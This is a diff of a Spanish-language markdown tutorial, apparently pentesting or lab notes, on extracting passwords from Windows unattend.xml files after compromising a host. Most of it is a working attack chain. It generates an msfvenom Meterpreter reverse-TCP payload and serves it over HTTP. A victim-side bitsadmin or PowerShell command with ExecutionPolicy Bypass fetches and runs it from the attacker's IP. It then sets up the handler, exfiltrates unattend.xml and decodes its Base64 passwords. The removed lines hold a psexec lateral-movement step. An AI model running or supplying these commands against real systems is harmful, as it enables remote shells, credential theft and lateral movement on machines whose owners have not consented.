@@ -1,118 +1,138 @@
-# Extracción de contraseñas desde `unattend.xml` en Windows con Meterpreter
+# 🔍 Searching for Passwords in Windows Configuration Files (unattend.xml)
 
 ---
 
-## 📋 Resumen
-
-Cuando un administrador despliega Windows con herramientas como Sysprep, puede dejar un archivo `unattend.xml` en el disco.  
-Este archivo contiene configuraciones del despliegue, incluyendo a menudo contraseñas locales en texto claro o codificadas en Base64.  
-Durante una post-explotación, es muy útil buscar y extraer estas credenciales.
+## 🧠 Objetivo
+Extraer contraseñas almacenadas en archivos de configuración de Windows (`unattend.xml`) a través de una sesión `meterpreter`, después de comprometer el equipo con un payload personalizado.
 
 ---
 
-# 🔍 ¿Dónde buscar el `unattend.xml`?
+## 🧰 Requisitos
+- Acceso a una máquina atacante con Kali Linux.
+- Acceso inicial a una máquina víctima con Windows.
+- `msfvenom`, `msfconsole`, servidor HTTP (Python), sesión `meterpreter`.
 
-Ubicaciones típicas:
+---
+
+## ⚙️ Paso 1: Crear el payload malicioso
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<tu_IP> LPORT=<puerto> -f exe > payload.exe
 ```
-C:\Windows\Panther\Unattend.xml
-C:\Windows\Panther\Unattend\Unattend.xml
-C:\Windows\System32\Sysprep\Sysprep.xml
-C:\Windows\System32\Sysprep\Panther\Unattend.xml
+
+- `-p` → payload meterpreter para Windows x64.
+- `LHOST` y `LPORT` → IP y puerto del atacante.
+- `-f exe` → formato ejecutable para Windows.
+
+---
+
+## 📡 Paso 2: Servir el payload con Python
+
+```bash
+python3 -m http.server 80
+```
+
+- Sirve `payload.exe` desde el directorio actual a través de HTTP.
+
+---
+
+## 💻 Paso 3: Descargar el payload desde la máquina víctima
+
+```cmd
+bitsadmin /transfer payload /download /priority high http://<tu_IP>/payload.exe C:\Windows\Temp\payload.exe
+```
+
+O (más moderno y estable):
+
+```cmd
+powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri http://<tu_IP>/payload.exe -OutFile C:\Windows\Temp\payload.exe"
 ```
 
 ---
 
-#  Pasos para extraerlo desde Meterpreter
+## 🚀 Paso 4: Lanzar Metasploit y configurar el handler
 
-### Conseguir una sesión `meterpreter` en la víctima
-Por ejemplo, usando un exploit o payload.
-
-### Navegar a las carpetas objetivo
-Desde `meterpreter`:
+```bash
+msfconsole
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST <tu_IP>
+set LPORT <puerto>
+set ExitOnSession false
+exploit -j
 ```
+
+- Deja el handler escuchando para recibir la conexión reversa.
+
+---
+
+## 🧨 Paso 5: Ejecutar el payload desde la víctima
+
+```cmd
+C:\Windows\Temp\payload.exe
+```
+
+Una vez ejecutado, recibirás una sesión en Metasploit.
+
+---
+
+## 🛰️ Paso 6: Buscar archivos de configuración en la víctima
+
+Desde la sesión `meterpreter`:
+
+```bash
 cd C:\\Windows\\Panther
-```
-
-Listar los archivos:
-```
 ls
 ```
 
-Si no está ahí, prueba las otras rutas (`C:\Windows\System32\Sysprep` etc.).
-
----
-
-### 3️ Descargar el archivo a tu máquina
-Una vez lo encuentres:
-```
-download unattend.xml /ruta/local/donde/guardarlo/
+Busca el archivo:
+```bash
+download unattend.xml /root/Desktop/
 ```
 
-Por ejemplo:
-```
-download unattend.xml /root/Desktop/unattend.xml
+O en otras rutas:
+```bash
+cd C:\\Windows\\System32\\Sysprep
+cd C:\\Windows\\Panther\\UnattendGC
 ```
 
 ---
 
-#  Identificar la contraseña en el archivo
+## 🔍 Paso 7: Leer y decodificar la contraseña (Base64)
 
-Abre el archivo descargado. Busca en las secciones `<UserData>` o `<AutoLogon>` algo así:
-```xml
-<AutoLogon>
-    <Password>
-        <Value>P@ssw0rd</Value>
-        <PlainText>true</PlainText>
-    </Password>
-</AutoLogon>
-```
+Abre el archivo `unattend.xml` descargado y localiza la línea:
 
-O en Base64:
 ```xml
 <Password>
-    <Value>UGFzc3dvcmQxMjM=</Value>
-    <PlainText>false</PlainText>
+  <Value>QWRtaW5AMTIz</Value>
+  <PlainText>false</PlainText>
 </Password>
 ```
 
----
+Decodifica en Linux:
 
-# Decodificar la contraseña si está en Base64
-
-Si la contraseña aparece codificada (`PlainText=false`), decódificala con `base64`.
-
-En Linux:
-```
-echo 'UGFzc3dvcmQxMjM=' | base64 -d
+```bash
+echo 'QWRtaW5AMTIz' | base64 -d
 ```
 
 Resultado:
 ```
-Password123
+Admin@123
 ```
 
-En Windows (PowerShell):
-```
-[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UGFzc3dvcmQxMjM="))
+O en PowerShell:
+
+```powershell
+[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRtaW5AMTIz"))
 ```
 
 ---
 
-#  Consejos
-- Aunque `PlainText=false`, la codificación Base64 **no es cifrado**, solo ofuscación: es trivial de recuperar.
-- Busca también `sysprep.xml` y cualquier `.xml` dentro de `Panther` o `Sysprep`, ya que pueden contener otras credenciales.
-- Una vez obtenida la contraseña, prueba a usarla en otras cuentas locales, RDP, SMB, etc.
----
-## Con esto entramos con Psexec:
+## ✅ Notas importantes
 
-````
-msfconsole
-use exploit/windows/smb/psexec
-set RHOSTS <IP_OBJETIVO>
-set SMBUser <usuario>
-set SMBPass <contraseña>
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST <tu_IP>
-set LPORT <tu_puerto>
-exploit
-````
+- `unattend.xml` se usa en despliegues automatizados de Windows (Sysprep) y **suele contener contraseñas en texto claro o Base64**.
+- También revisa: `sysprep.xml`, `autounattend.xml`, o cualquier `.xml` en `C:\Windows\Panther\` y `C:\Windows\System32\Sysprep`.
+- El hecho de que `PlainText=false` no significa que esté cifrado, sólo codificado (trivial de recuperar).
+
+---
+
